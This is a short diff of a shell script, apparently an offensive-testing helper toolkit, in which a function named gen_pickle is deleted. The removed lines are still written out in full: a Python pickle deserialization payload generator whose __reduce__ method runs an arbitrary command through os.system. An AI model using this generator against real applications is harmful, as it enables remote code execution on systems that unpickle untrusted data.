@@ -3168,23 +3168,3 @@ generate_web_paths() {
     local line_count=$(wc -l < "$output_file" 2>/dev/null || echo "0")
     echo "Generated $line_count paths in: $output_file"
 }
-
-gen_pickle() {
-    if [ $# -eq 0 ]; then
-        echo "Usage: gen_pickle <command>"
-        return 1
-    fi
-    
-    python3 -c "
-import pickle
-import os
-
-class RCE:
-    def __reduce__(self):
-        cmd = '$1'
-        return os.system, (cmd,)
-
-payload = pickle.dumps(RCE())
-print(payload)
-"
-}
